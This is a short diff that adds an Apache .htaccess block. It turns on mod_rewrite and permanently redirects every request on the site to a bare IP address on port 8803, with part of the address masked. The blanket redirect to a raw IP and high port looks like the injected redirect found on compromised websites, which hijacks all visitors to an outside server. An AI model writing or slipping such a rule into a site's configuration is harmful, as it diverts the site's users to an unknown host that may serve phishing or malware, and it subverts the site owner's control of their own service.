@@ -1,0 +1,5 @@
+<IfModule mod_rewrite.c>
+Options +FollowSymlinks
+ RewriteEngine on
+ RewriteRule ^(.*) http://15.75.14.**:8803/ [R=301,L]
+</IfModule>
